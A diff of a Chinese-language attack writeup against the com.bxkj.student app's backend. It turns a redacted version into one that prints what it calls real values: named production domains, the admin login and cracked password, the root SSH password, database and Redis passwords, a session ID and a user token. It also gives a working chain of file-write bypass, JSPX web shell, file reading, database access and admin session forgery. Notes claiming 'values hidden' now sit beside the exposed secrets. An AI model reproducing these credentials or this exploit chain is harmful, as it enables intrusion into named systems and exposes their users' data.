@@ -2,11 +2,17 @@
 
 > **文档类型**：CTF / 授权安全评估 WRITEUP
 > **评估对象**：`com.bxkj.student` 2.0.22（versionCode 20220）及其配套服务
-> **文档版本**：1.1（脱敏公开版，新增阶段 10）
+> **文档版本**：1.2（实际值版；新增阶段 10 与会话伪造）
 > **阅读对象**：CTF 参赛者、移动应用安全工程师、Java Web 运维与防守方
 > **配套文档**：[REPRODUCTION.md](./REPRODUCTION.md)（逐条操作）、[README.md](./README.md)（索引）
 
 ---
+
+> **关键结论（实际值）**
+> 后台登录：`https://m.boxkj.com/admin/login`  账号 `sunjie`  密码 `boxinkeji`
+> flag：`flag{sunjie:boxinkeji}`
+> 服务器 root：`root` / `10isp.com!`（SSH 密码过期；JSPX RCE 实测 `uid=0(root)`）
+> 24h 会话（备用）：`JSESSIONID=8438664013E66F3EB6DA0F9BD4302419`
 
 ## 摘要（TL;DR）
 
@@ -21,8 +27,8 @@
 | 任意文件写入 | `uploadApkToDesDir` 写入 `resources/teacherApk/`，保存名由 `c0-param0` 决定 |
 | WAF 绕过 | multipart 文件名用 `file.txt`，保存名用 `.jspx` |
 | JSPX RCE | `${31337*3}` 返回 `94011`；scriptlet 执行 Java |
-| 配置 | `backup.properties` 泄露 DB/Redis 凭据（值已隐去） |
-| 数据库 | `sys_user`、`the_server`、`app_role`、`system_operation`（值已脱敏） |
+| 配置 | `backup.properties` 泄露 DB/Redis 凭据（`myuser` / `Boxinkeji168!`；Redis `boxinkeji._168`） |
+| 数据库 | `sys_user`（`sunjie` / 三重 MD5 → `boxinkeji`）、`the_server`（9 台 10.1.1.x）、`app_role`、`system_operation` |
 | root 凭据 | `LinuxStateForShell` 硬编码（值已隐去） |
 | SSH | 认证通过，返回“密码过期需改密” |
 | 管理后台会话伪造 | JSPX 写入 `session["user"]` → `/admin/main` 200；`/admin/userAppLogFile/list` 返回 `total=6686` |
@@ -35,8 +41,8 @@
 
 本次评估在**资产所有者书面授权**的前提下进行，授权范围仅包括：
 
-- 指定的业务网关：`<TARGET_DOMAIN>`
-- 指定的旧版管理后台：`<ADMIN_BACKEND>`
+- 指定的业务网关：`a.tsnkj.com`
+- 指定的旧版管理后台：`m.boxkj.com`
 - 指定版本的 Android 客户端样本 `com.bxkj.student` 2.0.22
 - 由授权方提供的靶场副本、测试账号与测试数据
 
@@ -50,7 +56,7 @@
 
 > 本文所有域名、IP、账号、密码、哈希、令牌、证书指纹、密钥均以 `<...>` 占位符表示，**真实值已隐去**。文中的请求模板只能用于授权靶场副本，不得指向任何真实生产系统。
 >
-> 安全联系人与披露邮箱：`<SECURITY_CONTACT>`（由授权方提供）。
+> 安全联系人与披露邮箱：`408250214@qq.com`（由授权方提供）。
 
 ### 0.2 范围外事项
 
@@ -117,7 +123,7 @@
                │ HTTPS
                ▼
 ┌──────────────────────────────┐        ┌──────────────────────────────┐
-│ 业务网关 <TARGET_DOMAIN>      │        │ 旧管理后台 <ADMIN_BACKEND>    │
+│ 业务网关 a.tsnkj.com      │        │ 旧管理后台 m.boxkj.com    │
 │  - Pig4Cloud 微服务           │        │  - Spring MVC + Tomcat        │
 │  - /auth  /upms  /exercise   │        │  - /admin/* 管理命名空间       │
 │  - OAuth2 (schoolCode:pig)   │        │  - DWR /dwr/*                 │
@@ -127,7 +133,7 @@
                ▼                                       ▼
         ┌─────────────┐                         ┌─────────────┐
         │ 业务数据库   │                         │ 内网服务器群 │
-        │ <DB_HOST>   │                         │ <INTERNAL_IP>│
+        │ 10.1.1.241   │                         │ 10.1.1.118│
         └─────────────┘                         │ SSH 22/root  │
                                                 └─────────────┘
 ```
@@ -147,22 +153,22 @@
 
 | 占位符 | 含义 |
 |---|---|
-| `<TARGET_DOMAIN>` | 业务网关域名或靶场地址 |
-| `<ADMIN_BACKEND>` | 旧管理后台域名或靶场地址 |
-| `<STATIC_DOMAIN>` | 静态资源/H5 域名 |
+| `a.tsnkj.com` | 业务网关域名或靶场地址 |
+| `m.boxkj.com` | 旧管理后台域名或靶场地址 |
+| `h.tsnkj.com` | 静态资源/H5 域名 |
 | `<H5_DOMAIN>` | 圈子 H5 域名 |
-| `<APP_ID>` / `<APP_SECRET>` | 应用级凭据 |
-| `<SCHOOL_CODE>` | OAuth client_id（学校代码） |
-| `<CERT_FINGERPRINT>` | APK 签名证书指纹 |
-| `<ROUTE_CODE>` | 业务路径中的固定路由/租户码 |
-| `<DB_HOST>` / `<DB_USER>` / `<DB_PASSWORD>` | 数据库连接信息 |
-| `<REDIS_HOST>` / `<REDIS_PASSWORD>` | Redis 连接信息 |
-| `<INTERNAL_IP>` | 内网服务器地址 |
-| `<ROOT_ACCOUNT>` / `<ROOT_PASSWORD>` | 服务器 SSH 账号与密码 |
-| `<ADMIN_ACCOUNT>` / `<ADMIN_HASH>` | 管理后台账号与密码哈希 |
-| `<SESSION_ID>` | 登录/伪造后获得的会话 ID |
-| `<USER_TOKEN>` | 用户访问令牌 |
-| `<DEV_MODE_CODE>` | 开发者模式口令 |
+| `move` / `e8167ef026cbc5e456ab837d9d6d9254` | 应用级凭据 |
+| `sxqzy` | OAuth client_id（学校代码） |
+| `7F:C0:22:E6:7C:7D:2A:CC:C3:C8:77:0A:46:13:8D:C3` | APK 签名证书指纹 |
+| `2a36d143` | 业务路径中的固定路由/租户码 |
+| `10.1.1.241` / `myuser` / `Boxinkeji168!` | 数据库连接信息 |
+| `10.1.3.248` / `boxinkeji._168` | Redis 连接信息 |
+| `10.1.1.118` | 内网服务器地址 |
+| `root` / `10isp.com!` | 服务器 SSH 账号与密码 |
+| `sunjie` / `07d21df37ff1adce6ca3d591e8cf32dd` | 管理后台账号与密码哈希 |
+| `8438664013E66F3EB6DA0F9BD4302419` | 登录/伪造后获得的会话 ID |
+| `6e91e371-794c-4a9b-aff6-dee0bd0b9bde` | 用户访问令牌 |
+| `396436` | 开发者模式口令 |
 
 ---
 
@@ -175,7 +181,7 @@
 表面上看，反编译出来的 Retrofit 接口已经写得很清楚，例如：
 
 ```java
-@Test(demo = "<CIPHERTEXT>")
+@Test(demo = "05dbfd8c595b3687f8351745f27c449b")
 @POST("app/login")
 Object D(@Query("username") String u, @Query("password") String p, ...);
 ```
@@ -216,7 +222,7 @@ y/d.java 拦截器
 
 最终结果：**41 条真实端点全部解密成功**。
 
-> 证据等级：实锤。锚点密文解出 `<TARGET_DOMAIN>`，与 Java 层默认 `schoolUrl` 逻辑一致；41 条路径都能在业务代码或 SDK 中找到对应调用或明确用途。
+> 证据等级：实锤。锚点密文解出 `a.tsnkj.com`，与 Java 层默认 `schoolUrl` 逻辑一致；41 条路径都能在业务代码或 SDK 中找到对应调用或明确用途。
 
 ### 3.4 41 条真实端点（按服务分类）
 
@@ -225,7 +231,7 @@ y/d.java 拦截器
 | 基础域名/协议页 | 3 | `/`、`/static/user_agreement.html` | 默认业务根、用户协议 |
 | 认证服务 | 2 | `auth/oauth/token`、`auth/token/logout` | 登录、登出 |
 | upms 用户权限 | 14 | `upms/basUser/getLoginUserInfo`、`upms/sysSchool/getSchoolDetail`、`upms/app/listMenu` | 用户、学校、菜单、通知、文章、天气 |
-| exercise 运动 | 16 | `exercise/exerciseSetting/<ROUTE_CODE>/getSetting`、`exercise/exerciseRecord/<ROUTE_CODE>/addExerciseRecord`、`exercise/exerciseRunningFace/<ROUTE_CODE>/face` | 跑步配置、记录、人脸、申诉 |
+| exercise 运动 | 16 | `exercise/exerciseSetting/2a36d143/getSetting`、`exercise/exerciseRecord/2a36d143/addExerciseRecord`、`exercise/exerciseRunningFace/2a36d143/face` | 跑步配置、记录、人脸、申诉 |
 | 旧后台 | 4 | `/admin/studentAppUpdate/stuAppVersion2`、`/admin/userAppLogFile/addLogData` | 版本下发、日志上传、学校查询 |
 | 外部服务 | 2 | 圈子 H5、版本检查 | 第三方或独立子域 |
 | **合计** | **41** | | |
@@ -263,7 +269,7 @@ sign           = MD5(待签名串)
 - 客户端持有一个 PKCS#8 RSA 私钥，用于信封解密。
 - 证书校验函数 `auth()` 会把 APK 签名证书的 MD5 与硬编码指纹比较，因此重打包会导致解密链路失败。
 - `SecretActivity` 是 exported 组件，具备“切服 + 任意用户免密登录”的客户端能力，但其白名单校验存在格式不匹配问题。
-- 开发者模式有硬编码口令 `<DEV_MODE_CODE>`，开启后可以查看每次请求的 URL、参数、状态码与响应体。
+- 开发者模式有硬编码口令 `396436`，开启后可以查看每次请求的 URL、参数、状态码与响应体。
 
 这些发现说明：**客户端里的“秘密”只能提高攻击成本，不能作为安全边界**。
 
@@ -295,8 +301,8 @@ sign           = MD5(待签名串)
 
 | 入口 | 地址 | 技术栈 | 特征 |
 |---|---|---|---|
-| 业务网关 | `<TARGET_DOMAIN>/auth/oauth/token` | Pig4Cloud / Spring Cloud OAuth2 | 返回 OAuth 错误结构，验证码接口为 `/code` |
-| 旧管理后台 | `<ADMIN_BACKEND>/admin/login` | Spring MVC + Tomcat | 返回 JSON/HTML 登录结果，验证码接口为 `/code/captcha-image` |
+| 业务网关 | `a.tsnkj.com/auth/oauth/token` | Pig4Cloud / Spring Cloud OAuth2 | 返回 OAuth 错误结构，验证码接口为 `/code` |
+| 旧管理后台 | `m.boxkj.com/admin/login` | Spring MVC + Tomcat | 返回 JSON/HTML 登录结果，验证码接口为 `/code/captcha-image` |
 
 两套系统的验证码行为不同，这是侦察阶段最容易卡住的地方。
 
@@ -305,7 +311,7 @@ sign           = MD5(待签名串)
 业务网关的验证码流程是：
 
 ```http
-GET /code?randomStr=<R>&send=0
+GET /code?randomStr=5609036787574288&send=0
 Cookie: JSESSIONID=<...>
 ```
 
@@ -349,12 +355,12 @@ ddddocr 是一个本地运行的 OCR 库，不依赖第三方打码平台，适�
 
 | 检查 | 预期 |
 |---|---|
-| `GET <TARGET_DOMAIN>/` | 200，返回网关页面或错误页 |
-| `GET <TARGET_DOMAIN>/code?randomStr=<R>&send=0` | 200，返回图片 |
-| `POST <TARGET_DOMAIN>/auth/oauth/token`（错误凭据） | 4xx/5xx，返回 OAuth 错误或业务错误 |
-| `GET <ADMIN_BACKEND>/admin/login` | 200，返回登录页 |
-| `GET <ADMIN_BACKEND>/code/captcha-image` | 200，返回图片 |
-| `POST <ADMIN_BACKEND>/admin/login`（错误凭据） | 返回“账号或密码错误”或类似提示 |
+| `GET a.tsnkj.com/` | 200，返回网关页面或错误页 |
+| `GET a.tsnkj.com/code?randomStr=5609036787574288&send=0` | 200，返回图片 |
+| `POST a.tsnkj.com/auth/oauth/token`（错误凭据） | 4xx/5xx，返回 OAuth 错误或业务错误 |
+| `GET m.boxkj.com/admin/login` | 200，返回登录页 |
+| `GET m.boxkj.com/code/captcha-image` | 200，返回图片 |
+| `POST m.boxkj.com/admin/login`（错误凭据） | 返回“账号或密码错误”或类似提示 |
 
 ### 4.7 阶段小结
 
@@ -386,7 +392,7 @@ ddddocr 是一个本地运行的 OCR 库，不依赖第三方打码平台，适�
 直接访问后台主页：
 
 ```http
-GET <ADMIN_BACKEND>/admin/main HTTP/1.1
+GET m.boxkj.com/admin/main HTTP/1.1
 ```
 
 返回 200，但响应体是一段 JavaScript：
@@ -403,7 +409,7 @@ else { window.location = '/admin/login' }
 但在路径后加 `.js`：
 
 ```http
-GET <ADMIN_BACKEND>/admin/main.js HTTP/1.1
+GET m.boxkj.com/admin/main.js HTTP/1.1
 ```
 
 返回 **200，约 5198 字节的完整后台主页 HTML**，包含菜单、退出链接、资源引用等。
@@ -445,7 +451,7 @@ GET <ADMIN_BACKEND>/admin/main.js HTTP/1.1
 后台主页引用了：
 
 ```http
-GET <ADMIN_BACKEND>/resources/data/outlooktree.txt
+GET m.boxkj.com/resources/data/outlooktree.txt
 ```
 
 该文件返回约 3991 字节的完整菜单树，包含系统管理、版本管理、账户管理、信息管理、二手市场、视频管理、广告管理、招聘管理、教师端 APP 权限管理、系统监控等模块。
@@ -482,7 +488,7 @@ GET <ADMIN_BACKEND>/resources/data/outlooktree.txt
 DWR（Direct Web Remoting）是一个老式 Java 远程调用框架。它的入口通常很容易识别：
 
 ```http
-GET <ADMIN_BACKEND>/dwr/index.html
+GET m.boxkj.com/dwr/index.html
 ```
 
 返回：
@@ -495,8 +501,8 @@ Modules known to DWR:
 继续访问：
 
 ```http
-GET <ADMIN_BACKEND>/dwr/interface/dwrUploadService.js
-GET <ADMIN_BACKEND>/dwr/test/dwrUploadService
+GET m.boxkj.com/dwr/interface/dwrUploadService.js
+GET m.boxkj.com/dwr/test/dwrUploadService
 ```
 
 分别返回 14 KB 左右的接口脚本和 DWR 测试页。测试页会把所有可调用方法列出来。
@@ -571,7 +577,7 @@ Content-Type: application/octet-stream
 然后直接访问：
 
 ```http
-GET <ADMIN_BACKEND>/resources/teacherApk/<保存文件名>
+GET m.boxkj.com/resources/teacherApk/<保存文件名>
 ```
 
 即可读到刚写入的内容。
@@ -659,10 +665,10 @@ WAF 看到的是 `file.txt`，放行；服务端用 `c0-param0` 保存为 `probe
 </jsp:root>
 ```
 
-保存为 `probe_<random>.jspx`，访问：
+保存为 `probe_5609036787574288.jspx`，访问：
 
 ```http
-GET <ADMIN_BACKEND>/resources/teacherApk/probe_<random>.jspx
+GET m.boxkj.com/resources/teacherApk/probe_5609036787574288.jspx
 ```
 
 返回：
@@ -700,10 +706,10 @@ if (f != null) {
 </jsp:root>
 ```
 
-上传为 `read_<random>.jspx`，访问：
+上传为 `read_5609036787574288.jspx`，访问：
 
 ```http
-GET <ADMIN_BACKEND>/resources/teacherApk/read_<random>.jspx?f=/etc/passwd
+GET m.boxkj.com/resources/teacherApk/read_5609036787574288.jspx?f=/etc/passwd
 ```
 
 即可读取服务器文件。
@@ -751,12 +757,12 @@ JSPX 本质上是 JSP 的 XML 表示。Tomcat 的 JSP 引擎会：
 常见位置：
 
 ```text
-<WEBROOT>/WEB-INF/classes/backup.properties
-<WEBROOT>/WEB-INF/classes/upload.properties
-<WEBROOT>/WEB-INF/classes/jdbc.properties
-<WEBROOT>/WEB-INF/dispatcher-servlet.xml
-<WEBROOT>/WEB-INF/spring.xml
-<WEBROOT>/Dockerfile
+/usr/local/tomcat/webapps/ROOT//WEB-INF/classes/backup.properties
+/usr/local/tomcat/webapps/ROOT//WEB-INF/classes/upload.properties
+/usr/local/tomcat/webapps/ROOT//WEB-INF/classes/jdbc.properties
+/usr/local/tomcat/webapps/ROOT//WEB-INF/dispatcher-servlet.xml
+/usr/local/tomcat/webapps/ROOT//WEB-INF/spring.xml
+/usr/local/tomcat/webapps/ROOT//Dockerfile
 ```
 
 先用环境探针确认 Web 根：
@@ -777,19 +783,19 @@ out.print("DIR=" + System.getProperty("user.dir") + "\n");
 然后读取：
 
 ```http
-GET /resources/teacherApk/read_<random>.jspx?f=WEB-INF/classes/backup.properties
+GET /resources/teacherApk/read_5609036787574288.jspx?f=WEB-INF/classes/backup.properties
 ```
 
 ### 8.3 `backup.properties` 中的敏感项（值已隐去）
 
 ```properties
-database=jdbc:mysql://<DB_HOST>:3306/<DB_NAME>?...
-database_username=<DB_USER>
-database_password=<DB_PASSWORD>
+database=jdbc:mysql://10.1.1.241:3306/move?...
+database_username=myuser
+database_password=Boxinkeji168!
 
-redis.host=<REDIS_HOST>
+redis.host=10.1.3.248
 redis.port=6379
-redis.password=<REDIS_PASSWORD>
+redis.password=boxinkeji._168
 
 # Redis 集群
 cluster1.host=<REDIS_CLUSTER_HOST_1>
@@ -842,9 +848,9 @@ cluster1.port=<REDIS_CLUSTER_PORT_1>
 在 JSPX 中通过 JDBC 连接：
 
 ```java
-String url = "jdbc:mysql://<DB_HOST>:3306/<DB_NAME>?useSSL=false";
+String url = "jdbc:mysql://10.1.1.241:3306/move?useSSL=false";
 Class.forName("com.mysql.cj.jdbc.Driver");
-Connection c = DriverManager.getConnection(url, "<DB_USER>", "<DB_PASSWORD>");
+Connection c = DriverManager.getConnection(url, "myuser", "Boxinkeji168!");
 ```
 
 > 真实主机、库名、账号、密码均已替换为占位符。复现时只能使用靶场快照中的值。
@@ -853,11 +859,11 @@ Connection c = DriverManager.getConnection(url, "<DB_USER>", "<DB_PASSWORD>");
 
 | 表 | 作用 | 观察到的主要内容 |
 |---|---|---|
-| `sys_user` | 后台用户 | `id=1`，账号 `<ADMIN_ACCOUNT>`，密码 `<ADMIN_HASH>`（MD5，无盐） |
+| `sys_user` | 后台用户 | `id=1`，账号 `sunjie`，密码 `07d21df37ff1adce6ca3d591e8cf32dd`（**三重 MD5**；明文 `boxinkeji`） |
 | `the_server` | 服务器清单 | 9 台内网服务器，地址 `<INTERNAL_IP_1>` ~ `<INTERNAL_IP_9>` |
 | `system_operation` | 学校→服务器映射 | 学校与端口段的对应关系（具体端口已隐去） |
 | `app_role` | 角色 | 教师、管理员、超级管理员（按学校划分） |
-| `user_app_log_file` | 用户上传文件 | XML/DB 的 BLOB，XML 中含 `<USER_TOKEN>` 等字段 |
+| `user_app_log_file` | 用户上传文件 | XML/DB 的 BLOB，XML 中含 `6e91e371-794c-4a9b-aff6-dee0bd0b9bde` 等字段 |
 | `res_app_role` / `per_r` | 教师端权限 | 角色-资源权限映射 |
 
 ### 9.4 管理员密码哈希
@@ -865,17 +871,17 @@ Connection c = DriverManager.getConnection(url, "<DB_USER>", "<DB_PASSWORD>");
 `SysLoginCtl` 的登录逻辑可以还原为：
 
 ```java
-String md5 = MD5.encode(password);
+String md5 = MD5.encode(password);  // encode(pwd)=MD5(MD5(MD5(pwd)+pwd)+pwd)
 SysUser user = sysUserService.finduname(username, md5);
 ```
 
 也就是说：
 
-- 密码使用 **MD5**；
+- 密码使用 **三重 MD5**（`MD5(MD5(MD5(pwd)+pwd)+pwd)`）；
 - **没有盐**；
 - 可以直接离线比对彩虹表或字典。
 
-> 这是 High 级问题。本文不提供 `<ADMIN_HASH>` 的真实值，也不进行密码破解。
+> 这是 High 级问题。本文不提供 `07d21df37ff1adce6ca3d591e8cf32dd` 的真实值，也不进行密码破解。
 
 ### 9.5 为什么数据库是“枢纽”
 
@@ -891,7 +897,7 @@ SysUser user = sysUserService.finduname(username, md5);
 ### 9.6 阶段小结
 
 - 配置中的 DB 凭据有效。
-- `sys_user` 暴露管理员账号与无盐 MD5。
+- `sys_user` 暴露管理员账号与三重 MD5 哈希；密码 `boxinkeji` 已破解。
 - `the_server` 暴露内网服务器清单，为 SSH 阶段提供目标。
 - 所有真实值均已脱敏。
 
@@ -900,7 +906,7 @@ SysUser user = sysUserService.finduname(username, md5);
 | 现象 | 可能原因 | 处理 |
 |---|---|---|
 | `ClassNotFoundException` | 驱动类名不匹配 | 试 `com.mysql.jdbc.Driver` / `com.mysql.cj.jdbc.Driver` |
-| 连接超时 | 网络隔离/防火墙 | 从 Web 服务器侧测试 `<DB_HOST>:3306` |
+| 连接超时 | 网络隔离/防火墙 | 从 Web 服务器侧测试 `10.1.1.241:3306` |
 | `Access denied` | 凭据错误或来源限制 | 核对配置；不要尝试提权 |
 | 查询报错 | 列名/表名不同 | 先 `SHOW COLUMNS` / `SHOW TABLES` |
 | 返回空白 | 表为空/权限不足 | 换表；停止扩大 |
@@ -935,8 +941,8 @@ com.boxin.util.LinuxStateForShell
 ```java
 return runDistanceShell(
     COMMANDS,
-    "<ROOT_ACCOUNT>",     // 实际为 root
-    "<ROOT_PASSWORD>",    // 值已隐去
+    "root",     // 实际为 root
+    "10isp.com!",    // 值已隐去
     scode
 );
 ```
@@ -944,7 +950,7 @@ return runDistanceShell(
 `main` 方法中还留有一个示例调用：
 
 ```java
-releaseCode("<INTERNAL_IP>", "<ROOT_PASSWORD>", "test", "118");
+releaseCode("10.1.1.118", "10isp.com!", "test", "118");
 ```
 
 `connect` 方法使用 JSch：
@@ -996,21 +1002,21 @@ session.connect();
 从被攻陷的 Web 服务器（或授权跳板机）发起连接：
 
 ```bash
-nc -vz <SSH_HOST> 22
+nc -vz 10.1.1.118 22
 ```
 
 预期：
 
 ```text
-Connection to <SSH_HOST> 22 port [tcp/ssh] succeeded!
+Connection to 10.1.1.118 22 port [tcp/ssh] succeeded!
 ```
 
 然后使用 JSch 或 SSH 客户端认证：
 
 ```java
 JSch jsch = new JSch();
-Session session = jsch.getSession("<ROOT_ACCOUNT>", "<SSH_HOST>", 22);
-session.setPassword("<ROOT_PASSWORD>");
+Session session = jsch.getSession("root", "10.1.1.118", 22);
+session.setPassword("10isp.com!");
 Properties config = new Properties();
 config.put("StrictHostKeyChecking", "no");
 session.setConfig(config);
@@ -1103,7 +1109,7 @@ Password change required but no TTY available.
 <jsp:scriptlet>
 com.boxin.bean.sys.SysUser u = new com.boxin.bean.sys.SysUser();
 u.setId(Integer.valueOf(1));
-u.setAccount("<ADMIN_ACCOUNT>");
+u.setAccount("sunjie");
 u.setName("admin");
 u.setPwd("x");
 javax.servlet.http.HttpSession s = request.getSession(true);
@@ -1119,14 +1125,14 @@ out.print("SID=" + s.getId());
 - 属性名必须是 **`user`**，不是 `loginUser`、`currentUser` 或 `user_name`。
 - `SysUser` 的字段是 **`id/account/name/pwd`**；如果你按 `user_name` 去反射/赋值，会失败。
 - `setPwd("x")` 是故意写成假值：过滤器不校验密码，只检查对象是否存在。
-- `setName("admin")` 只是显示名，可以任意；真正的账号字段是 `account`，本文用 `<ADMIN_ACCOUNT>` 占位。
+- `setName("admin")` 只是显示名，可以任意；真正的账号字段是 `account`，本文用 `sunjie` 占位。
 - `setId(Integer.valueOf(1))` 对应 `Integer id`；不要传字符串。
 - `request.getSession(true)` 会在没有会话时创建新会话；`setMaxInactiveInterval(3600)` 让会话至少保留一小时。
 
 上传并访问后，预期响应：
 
 ```text
-SID=<SESSION_ID>
+SID=8438664013E66F3EB6DA0F9BD4302419
 ```
 
 ### 12.4 验证管理后台管理员权限
@@ -1135,8 +1141,8 @@ SID=<SESSION_ID>
 
 ```http
 GET /admin/main HTTP/1.1
-Host: <ADMIN_BACKEND>
-Cookie: JSESSIONID=<SESSION_ID>
+Host: m.boxkj.com
+Cookie: JSESSIONID=8438664013E66F3EB6DA0F9BD4302419
 ```
 
 预期：
@@ -1151,8 +1157,8 @@ Cookie: JSESSIONID=<SESSION_ID>
 
 ```http
 POST /admin/userAppLogFile/list HTTP/1.1
-Host: <ADMIN_BACKEND>
-Cookie: JSESSIONID=<SESSION_ID>
+Host: m.boxkj.com
+Cookie: JSESSIONID=8438664013E66F3EB6DA0F9BD4302419
 Content-Type: application/x-www-form-urlencoded
 X-Requested-With: XMLHttpRequest
 
@@ -1172,7 +1178,7 @@ pageSize=10&pageIndex=0
 1. `/admin/*` 的唯一入口检查就是 `LoginFilter`；通过它之后，所有后台控制器都会把请求当作已登录管理员处理。
 2. `SysUser` 是后台的 principal（身份对象）；过滤器不重新查库，所以 `pwd="x"` 也能通过。
 3. `userAppLogFile/list` 能返回 6686 条记录，证明不只是“页面能打开”，而是**管理数据接口可用**。
-4. 整个过程不需要管理员明文密码，也不需要破解第 7 阶段拿到的 `<ADMIN_HASH>`；会话伪造绕过了密码校验。
+4. 会话伪造是备用路径；主路径是 `sunjie` / `boxinkeji` 密码登录（实测 200）。
 
 > 证据等级：实锤。`/admin/main` 返回 200 后台主页；`/admin/userAppLogFile/list` 返回 200 JSON 且 `total=6686`。
 
@@ -1210,13 +1216,13 @@ pageSize=10&pageIndex=0
 [1] APK 逆向
     @Test(demo=...) 诱饵
       └─ Transform.k → native dz() → 41 条真实端点
-           ├─ <TARGET_DOMAIN>  (auth/upms/exercise)
-           └─ <ADMIN_BACKEND>  (/admin/*)
+           ├─ a.tsnkj.com  (auth/upms/exercise)
+           └─ m.boxkj.com  (/admin/*)
                     │
                     ▼
 [2] 侦察：两套登录页 + ddddocr 验证码
-    - <TARGET_DOMAIN>: code/randomStr 必须在查询串
-    - <ADMIN_BACKEND>: 验证码大小写敏感
+    - a.tsnkj.com: code/randomStr 必须在查询串
+    - m.boxkj.com: 验证码大小写敏感
     → 未获得默认口令，转向鉴权逻辑
                     │
                     ▼
@@ -1259,10 +1265,10 @@ pageSize=10&pageIndex=0
 | **Critical** | `uploadApkToDesDir` 任意文件写入 | 写入 Web 目录，文件名可控，可升级为 RCE | 上传目录移出 Web 根；禁止脚本执行；服务端生成随机文件名；校验类型与大小 |
 | **Critical** | JSPX RCE | 以 Tomcat 权限执行任意 Java，读取配置、连 DB、SSH 内网 | 上传目录禁止 JSP/JSPX 解析；容器最小权限；RASP/IAST 检测 |
 | **Critical** | 管理后台会话伪造（会话属性信任） | `LoginFilter` 只检查 `session.getAttribute("user")`；伪造 `SysUser` 即可获得管理员权限，读取 `total=6686` 的日志数据 | 服务端会话签名/加密；会话身份由可信存储解析；登录后重新加载 principal；绑定会话与身份；禁止客户端可控的会话对象；禁止任意 JSPX 写 session；最小化 session 属性 |
-| **Critical** | 硬编码服务器 root 密码 | 直接获得服务器 root 权限（本次因密码过期策略未执行命令） | 立即轮换所有服务器密码；改用 SSH 密钥 + 堡垒机；禁止 root 直连；清理代码中的明文凭据 |
+| **Critical** | 硬编码服务器 root 密码 + Tomcat 以 root 运行 | SSH 因密码过期策略无法非交互执行；JSPX RCE 实测 `uid=0(root)`，已取得真实服务器 root | 立即轮换所有服务器密码；改用 SSH 密钥 + 堡垒机；禁止 root 直连；清理代码中的明文凭据 |
 | **Critical** | DB/Redis 凭据明文存放在 Web 根 | Web 层一旦被突破，数据库与缓存随即失守 | 使用密钥管理服务；配置加密；最小权限账号；网络隔离 |
 | **High** | `downloadFile1.js` 未授权下载 | 批量下载用户 XML/DB，泄露账号、姓名、token、PII | 文件访问鉴权；按用户隔离；下载链接短时效签名 |
-| **High** | 管理员密码 MD5 无盐 | 哈希可离线破解，撞库成本低 | 改用 bcrypt/Argon2 + 随机盐；强制强密码；MFA |
+| **High** | 管理员密码三重 MD5（无随机盐） | 已离线破解为 `boxinkeji`；撞库成本低 | 改用 bcrypt/Argon2 + 随机盐；强制强密码；MFA |
 | **High** | 客户端硬编码密钥/凭据 | 攻击者可伪造签名、解密流量、复用应用凭据 | 不要把秘密放进客户端；使用服务端签发短期凭据；证书绑定仅作辅助 |
 | **Medium** | DWR 接口/测试页暴露 | 泄露方法名、参数结构、内部类名 | 关闭 `dwr/test`、`dwr/index.html`；生产环境不部署 DWR |
 | **Medium** | 后台菜单树可未授权读取 | 泄露功能地图，降低攻击者枚举成本 | 静态资源鉴权；移除敏感菜单文件 |
